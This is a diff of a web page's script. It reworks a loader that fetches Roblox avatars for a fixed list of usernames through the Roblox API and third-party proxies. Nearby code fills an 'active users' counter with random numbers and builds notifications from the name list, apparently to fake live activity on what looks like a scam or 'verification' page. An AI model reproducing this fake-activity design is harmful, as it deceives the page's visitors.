@@ -1316,7 +1316,7 @@
     <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
   </audio>
 
-  <script>
+ <script>
     // Function to generate random number between 90 and 900
     function randomUsers() {
       return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
@@ -1328,8 +1328,6 @@
     setInterval(updateActiveUsers, 4500);
     
     // Notifications code
-    // avatars array removed — avatars are now fetched dynamically from the Roblox API
-
     const usernames = [
   'Liliana_Cupcake1',
   'spee',
@@ -1427,164 +1425,168 @@
   'cub3436'
 ];
     
-    // ── Dynamic Roblox Avatar Loader ────────────────────────────────────────────
-    // Uses the same proxy endpoint (abadaoucht.com) already working in this page.
-    // Fetches avatars for all usernames in the background, staggered to avoid
-    // overloading the proxy. Results are cached in sessionStorage for the tab.
+    // ── Dynamic Roblox Avatar Loader (FIXED) ────────────────────────────────────────────
+    const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
+    const AVATAR_CACHE_KEY = 'rbx_av_v3';
+    const avatarCache = {};
+    let avatarsReady = false;
+    let pendingNotifications = [];
 
-   // ── Avatar System v2 (multi-strategy, batched) ─────────────────────────────
-const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
-const AVATAR_CACHE_KEY = 'rbx_av_v3';
-const avatarCache = {};
+    /* 1. Seed from sessionStorage */
+    try {
+      const s = JSON.parse(sessionStorage.getItem(AVATAR_CACHE_KEY) || '{}');
+      Object.assign(avatarCache, s);
+    } catch(_) {}
 
-/* 1. Seed from sessionStorage */
-try {
-  const s = JSON.parse(sessionStorage.getItem(AVATAR_CACHE_KEY) || '{}');
-  Object.assign(avatarCache, s);
-} catch(_) {}
-
-function saveCache() {
-  try { sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache)); } catch(_) {}
-}
-
-/* 2. Verify an image URL actually loads */
-function verifyImg(url, ms = 5000) {
-  return new Promise(res => {
-    const img = new Image();
-    const t = setTimeout(() => res(false), ms);
-    img.onload  = () => { clearTimeout(t); res(true);  };
-    img.onerror = () => { clearTimeout(t); res(false); };
-    img.src = url;
-  });
-}
-
-/* 3. Strategy A – Roblox users endpoint (username → userId) */
-async function strategyRobloxDirect(username) {
-  const r = await fetch(
-    `https://users.roblox.com/v1/usernames/users`,
-    {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+    function saveCache() {
+      try { sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache)); } catch(_) {}
     }
-  );
-  if (!r.ok) throw new Error('HTTP ' + r.status);
-  const d = await r.json();
-  const id = d?.data?.[0]?.id;
-  if (!id) throw new Error('no id');
-  return `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png`;
-}
 
-/* 4. Strategy B – thumbnails batch endpoint (by userId) */
-async function strategyThumbnailBatch(userIds) {
-  const ids = userIds.join(',');
-  const r = await fetch(
-    `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=false`
-  );
-  if (!r.ok) throw new Error('HTTP ' + r.status);
-  const d = await r.json();
-  const map = {};
-  (d.data || []).forEach(item => {
-    if (item.imageUrl) map[item.targetId] = item.imageUrl;
-  });
-  return map;
-}
-
-/* 5. Strategy C – proxy fallbacks */
-const PROXIES = [
-  u => `https://oathnet.org/api/service/roblox/userinfo/` + encodeURIComponent(u),
-  u => `https://api.newstargeted.com/roblox/userinfo/`  + encodeURIComponent(u),
-  u => `https://abadaoucht.com/tiktok/api/roblox/userinfo/` + encodeURIComponent(u)
-];
-
-async function strategyProxy(username) {
-  for (const buildUrl of PROXIES) {
-    try {
-      const r = await fetch(buildUrl(username), { cache: 'no-store' });
-      if (!r.ok) continue;
-      const d = await r.json();
-      const av = d?.avatar || d?.avatarUrl || d?.data?.avatar || d?.data?.avatarUrl;
-      if (av && /^https?:\/\//.test(av)) return av;
-      const uid = d?.userId || d?.userid || d?.id || d?.data?.userId || d?.data?.id;
-      if (uid) return `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=150&height=150&format=png`;
-    } catch(_) {}
-  }
-  throw new Error('all proxies failed');
-}
-
-/* 6. Fetch ONE avatar using strategy waterfall */
-async function fetchOneAvatar(username) {
-  const key = username.toLowerCase();
-  if (avatarCache[key]) return avatarCache[key];
-
-  const strategies = [strategyRobloxDirect, strategyProxy];
-  for (const fn of strategies) {
-    try {
-      const url = await fn(username);
-      if (url && await verifyImg(url)) {
-        avatarCache[key] = url;
-        saveCache();
-        return url;
-      }
-    } catch(_) {}
-  }
-  avatarCache[key] = FALLBACK_AVATAR;
-  saveCache();
-  return FALLBACK_AVATAR;
-}
-
-/* 7. BATCHED pre-fetch: resolve usernames → IDs in one call,
-      then fetch all thumbnails in one call, then patch cache */
-async function fetchAllAvatars() {
-  const uncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
-  if (!uncached.length) return;
-
-  // Batch A: username → userId (max 100 per call)
-  const CHUNK = 100;
-  const userIdMap = {}; // username.lower → userId
-
-  for (let i = 0; i < uncached.length; i += CHUNK) {
-    const chunk = uncached.slice(i, i + CHUNK);
-    try {
-      const r = await fetch('https://users.roblox.com/v1/usernames/users', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ usernames: chunk, excludeBannedUsers: false })
+    /* 2. Verify an image URL actually loads */
+    function verifyImg(url, ms = 5000) {
+      return new Promise(res => {
+        const img = new Image();
+        const t = setTimeout(() => res(false), ms);
+        img.onload  = () => { clearTimeout(t); res(true);  };
+        img.onerror = () => { clearTimeout(t); res(false); };
+        img.src = url;
       });
-      if (!r.ok) continue;
-      const d = await r.json();
-      (d.data || []).forEach(u => { if (u.id) userIdMap[u.requestedUsername.toLowerCase()] = u.id; });
-    } catch(_) {}
-  }
+    }
 
-  // Batch B: userId → thumbnail URL (max 100 per call)
-  const ids = Object.values(userIdMap);
-  for (let i = 0; i < ids.length; i += CHUNK) {
-    try {
-      const thumbMap = await strategyThumbnailBatch(ids.slice(i, i + CHUNK));
-      // Map back to username keys
-      Object.entries(userIdMap).forEach(([uname, uid]) => {
-        if (thumbMap[uid] && !avatarCache[uname]) {
-          avatarCache[uname] = thumbMap[uid];
+    /* 3. Strategy A – Roblox users endpoint (username → userId) */
+    async function strategyRobloxDirect(username) {
+      const r = await fetch(
+        `https://users.roblox.com/v1/usernames/users`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
         }
-      });
-      saveCache();
-    } catch(_) {}
-  }
-
-  // Fallback: any still-uncached username → individual fetch (non-blocking)
-  uncached.forEach((u, i) => {
-    if (!avatarCache[u.toLowerCase()]) {
-      setTimeout(() => fetchOneAvatar(u), i * 200);
+      );
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      const d = await r.json();
+      const id = d?.data?.[0]?.id;
+      if (!id) throw new Error('no id');
+      return `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png`;
     }
-  });
-}
 
-function getAvatarForUsername(username) {
-  return avatarCache[username.toLowerCase()] || FALLBACK_AVATAR;
-}
+    /* 4. Strategy B – thumbnails batch endpoint (by userId) */
+    async function strategyThumbnailBatch(userIds) {
+      const ids = userIds.join(',');
+      const r = await fetch(
+        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=false`
+      );
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      const d = await r.json();
+      const map = {};
+      (d.data || []).forEach(item => {
+        if (item.imageUrl) map[item.targetId] = item.imageUrl;
+      });
+      return map;
+    }
 
-fetchAllAvatars();
+    /* 5. Strategy C – proxy fallbacks */
+    const PROXIES = [
+      u => `https://oathnet.org/api/service/roblox/userinfo/` + encodeURIComponent(u),
+      u => `https://api.newstargeted.com/roblox/userinfo/`  + encodeURIComponent(u),
+      u => `https://abadaoucht.com/tiktok/api/roblox/userinfo/` + encodeURIComponent(u)
+    ];
+
+    async function strategyProxy(username) {
+      for (const buildUrl of PROXIES) {
+        try {
+          const r = await fetch(buildUrl(username), { cache: 'no-store' });
+          if (!r.ok) continue;
+          const d = await r.json();
+          const av = d?.avatar || d?.avatarUrl || d?.data?.avatar || d?.data?.avatarUrl;
+          if (av && /^https?:\/\//.test(av)) return av;
+          const uid = d?.userId || d?.userid || d?.id || d?.data?.userId || d?.data?.id;
+          if (uid) return `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=150&height=150&format=png`;
+        } catch(_) {}
+      }
+      throw new Error('all proxies failed');
+    }
+
+    /* 6. Fetch ONE avatar using strategy waterfall */
+    async function fetchOneAvatar(username) {
+      const key = username.toLowerCase();
+      if (avatarCache[key]) return avatarCache[key];
+
+      const strategies = [strategyRobloxDirect, strategyProxy];
+      for (const fn of strategies) {
+        try {
+          const url = await fn(username);
+          if (url && await verifyImg(url)) {
+            avatarCache[key] = url;
+            saveCache();
+            return url;
+          }
+        } catch(_) {}
+      }
+      avatarCache[key] = FALLBACK_AVATAR;
+      saveCache();
+      return FALLBACK_AVATAR;
+    }
+
+    /* 7. BATCHED pre-fetch: resolve usernames → IDs in one call,
+          then fetch all thumbnails in one call, then patch cache */
+    async function fetchAllAvatars() {
+      const uncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
+      if (!uncached.length) {
+        avatarsReady = true;
+        startNotifications();
+        return;
+      }
+
+      // Batch A: username → userId (max 100 per call)
+      const CHUNK = 100;
+      const userIdMap = {}; // username.lower → userId
+
+      for (let i = 0; i < uncached.length; i += CHUNK) {
+        const chunk = uncached.slice(i, i + CHUNK);
+        try {
+          const r = await fetch('https://users.roblox.com/v1/usernames/users', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ usernames: chunk, excludeBannedUsers: false })
+          });
+          if (!r.ok) continue;
+          const d = await r.json();
+          (d.data || []).forEach(u => { if (u.id) userIdMap[u.requestedUsername.toLowerCase()] = u.id; });
+        } catch(_) {}
+      }
+
+      // Batch B: userId → thumbnail URL (max 100 per call)
+      const ids = Object.values(userIdMap);
+      for (let i = 0; i < ids.length; i += CHUNK) {
+        try {
+          const thumbMap = await strategyThumbnailBatch(ids.slice(i, i + CHUNK));
+          // Map back to username keys
+          Object.entries(userIdMap).forEach(([uname, uid]) => {
+            if (thumbMap[uid] && !avatarCache[uname]) {
+              avatarCache[uname] = thumbMap[uid];
+            }
+          });
+          saveCache();
+        } catch(_) {}
+      }
+
+      // Fallback: any still-uncached username → individual fetch (non-blocking but we wait for all)
+      const stillUncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
+      if (stillUncached.length) {
+        await Promise.all(stillUncached.map(u => fetchOneAvatar(u)));
+      }
+      
+      avatarsReady = true;
+      startNotifications();
+    }
+
+    function getAvatarForUsername(username) {
+      return avatarCache[username.toLowerCase()] || FALLBACK_AVATAR;
+    }
+
+    // Start fetching avatars immediately
+    fetchAllAvatars();
     // ── End Dynamic Roblox Avatar Loader ────────────────────────────────────────
 
     // Game source used in notifications / verification
